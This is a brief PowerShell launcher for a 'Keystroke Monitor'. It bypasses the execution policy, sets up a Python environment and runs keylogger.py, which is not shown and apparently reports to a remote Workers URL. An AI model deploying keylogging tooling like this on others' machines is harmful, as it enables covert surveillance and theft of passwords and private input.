# Keystroke Monitor - Windows Startup Script
# Run: powershell -ExecutionPolicy Bypass -File start.ps1

# Set your Worker URL before running
if (-not $env:KM_API_URL) {
    Write-Host "ERROR: Set KM_API_URL first. Example:" -ForegroundColor Red
    Write-Host '  $env:KM_API_URL = "https://your-worker.your-subdomain.workers.dev"' -ForegroundColor Yellow
    exit 1
}

# Activate venv or create it
if (Test-Path ".\.venv\Scripts\Activate.ps1") {
    .\.venv\Scripts\Activate.ps1
} else {
    python -m venv .venv
    .\.venv\Scripts\Activate.ps1
    pip install -r requirements.txt
}

python keylogger.py
